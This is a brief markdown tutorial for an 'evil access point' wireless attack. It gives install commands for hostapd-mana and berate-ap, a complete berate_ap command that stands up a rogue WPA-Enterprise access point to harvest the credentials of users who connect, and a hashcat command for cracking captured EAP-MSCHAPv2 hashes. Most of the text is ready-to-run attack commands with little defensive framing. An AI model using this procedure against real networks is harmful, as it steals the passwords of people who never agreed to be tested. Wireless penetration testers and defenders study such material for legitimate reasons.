# Evil Access Point Attack

This attack used hostapd-mana with berate-ap to create a fake access point which can retrieve the (hashed) credentials of users connecting to it.

## Install tools

```
sudo apt-get update
sudo apt install hostapd-mana
sudo apt install berate-ap
```

## Create fake access point

```
sudo berate_ap --eap -n wlan0 “Evil Access Point” --eap-cert-subj “/O=LIVE/ST=Somewhere/” --mana-wpe --mana-eapsuccess -w 3
```

This command will create a fake access point with the ssid, if a user connects to it his credentials will be stolen. In case of ttls they will be available in plaintext, otherwise you will have to crack the hashed password.

## Crack the password hash

### EAP-MSCHAPv2

In case the hash used is EAP-MSCHAPv2 you can decrypt the password with hashcat and a wordlist by running:

```
hashcat -m 5500 -a 0 username::::hash:hash wordlist.dict -o cracked.txt
```

## Links

- [Video Tutorial](https://www.youtube.com/watch?v=ULBQh5USuwo)
